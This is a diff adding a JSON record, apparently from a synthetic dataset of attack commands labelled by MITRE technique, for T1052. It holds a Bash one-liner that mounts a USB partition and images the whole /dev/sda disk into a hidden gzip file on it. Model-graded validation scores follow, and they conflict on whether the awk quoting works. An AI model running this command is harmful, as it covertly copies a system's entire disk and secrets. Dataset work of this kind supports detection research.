@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1052",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "sudo bash -c 'UPART=$(lsblk -pn -o NAME,TRAN | awk \"$2==\\\"usb\\\"{print $1\\\"1\\\"}\" | head -n1); mkdir -p /mnt/usb && mount \"$UPART\" /mnt/usb && dd if=/dev/sda bs=4M status=none | gzip -1 > /mnt/usb/.sysdisk.gz && sync && umount /mnt/usb'",
+  "explanation": "Reads raw data from the local system disk (/dev/sda), compresses it with gzip, and saves it to a mounted USB partition, ensuring data leaves only via physical media.",
+  "rationale_steps": [
+    "Identify and mount the USB partition.",
+    "Read raw disk data locally using dd.",
+    "Compress the stream with gzip to reduce size.",
+    "Write to the USB, sync, and unmount.",
+    "No network-based transfer involved."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-a8d8a262-2659524f",
+  "source_prompt_hash": "a8d8a262",
+  "timestamp_utc": "2025-09-30T05:22:34.253309Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting, proper separators, and valid options across lsblk, mount, dd, gzip, sync, and umount.",
+        "semantic_score": 3,
+        "semantic_justification": "The workflow aligns with exfiltration to a USB device, but the awk program is misquoted so $1/$2 expand in the shell, likely leaving UPART empty and causing the mount (and thus the exfiltration) to fail.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T10:07:49.695870Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper use of bash -c with single-quoted heredoc, correct awk quoting, valid command separators (&&), and proper variable expansion throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1052 by auto-detecting a USB device via lsblk transport type, mounting it, performing a raw disk image of /dev/sda with dd, compressing it with gzip into a hidden dotfile (.sysdisk.gz) on the USB, syncing, and unmounting — fully consistent with physical medium exfiltration of an entire disk.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-18T22:41:08.350872Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is properly quoted and escaped, using valid shell syntax, balanced quotes, and logical command chaining.",
+        "semantic_score": 5,
+        "semantic_justification": "The command successfully identifies a USB device via lsblk, mounts it, images the system disk with compression for exfiltration, and cleans up, perfectly matching the T1052 technique.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T22:41:12.289400Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
